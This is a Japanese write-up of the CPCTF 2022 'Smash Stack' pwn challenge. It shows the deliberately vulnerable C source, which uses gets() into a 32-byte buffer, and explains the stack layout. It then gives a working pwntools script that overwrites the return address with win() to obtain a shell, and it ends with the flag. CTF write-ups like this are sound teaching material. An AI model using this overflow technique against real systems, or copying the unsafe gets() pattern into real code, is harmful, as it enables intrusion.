# CPCTF 2022 `Smash Stack [pwn]` writeup

## 問題
Let's learn how to exploit!

`nc smash-stack.cpctf.space 30005`

ソースコードが配られている。

```c
#include <stdio.h>

void show_stack(char *buf) {
	printf("\n");
	printf("Stack Infomation\n");

	// stack
	printf("\n");
	printf("             | address        | value              |\n");
	printf(" buf       > | %p | 0x%016llx |\n", ((long long *)buf), ((long long *)buf)[0]);
	for (int i = 1; i < 4; i++) {
		printf("             | %p | 0x%016llx |\n", ((long long *)buf) + i, ((long long *)buf)[i]);
	}
	printf(" saved rsp > | %p | 0x%016llx |\n", ((long long *)buf) + 4, ((long long *)buf)[4]);
	printf(" retaddr   > | %p | 0x%016llx |\n", ((long long *)buf) + 5, ((long long *)buf)[5]);
	printf("\n");
}

void win() {
	execve("/bin/sh", NULL, NULL);
}

int vuln() {
	char buf[32] = {};
	show_stack(buf);
	printf("win: %p\n\n", win);
	gets(buf);
	show_stack(buf);
	return 0;
}

int main() {
	setbuf(stdout, NULL);
	setbuf(stdin, NULL);
	vuln();
	return 0;
}
```

## 解法
ソースコードを見ると、win関数に飛ばせばシェルを奪えることが分かる。
他にも色々書いてあるがとりあえず接続してみる。

```
Stack Infomation

             | address        | value              |
 buf       > | 0x7ffd579be2f0 | 0x0000000000000000 |
             | 0x7ffd579be2f8 | 0x0000000000000000 |
             | 0x7ffd579be300 | 0x0000000000000000 |
             | 0x7ffd579be308 | 0x0000000000000000 |
 saved rsp > | 0x7ffd579be310 | 0x0000000000401090 |
 retaddr   > | 0x7ffd579be318 | 0x00000000004010b7 |

win: 0x4011b0
```

スタックの上から順に
* 標準入力を受け取るバッファ32バイト
* main関数のベースポインタ8バイト
* リターンアドレス8バイト

が詰まれている。
加えてwin関数のアドレスも教えてくれるようだ。

## Exploit
問題タイトルにあるようにスタックスマッシュを狙ってリターンアドレスをwin関数のアドレスで書き換える。

```py
import pwn
import sys

buf_size = 32

io = pwn.remote("smash-stack.cpctf.space",30005)

ret = io.recvuntil("win: ")
print(ret)

ret = io.recvline(keepends=False)
print(ret)

addr_win = int(ret.decode(), 16)

print(addr_win)

s = b'A' * buf_size
s += b'A' * 8
s += pwn.p64(addr_win)
io.send(s)
io.interactive()
```

FLAG: `CPCTF{Welc0me_t0_3xc1t1ng_pwn_w0rld}`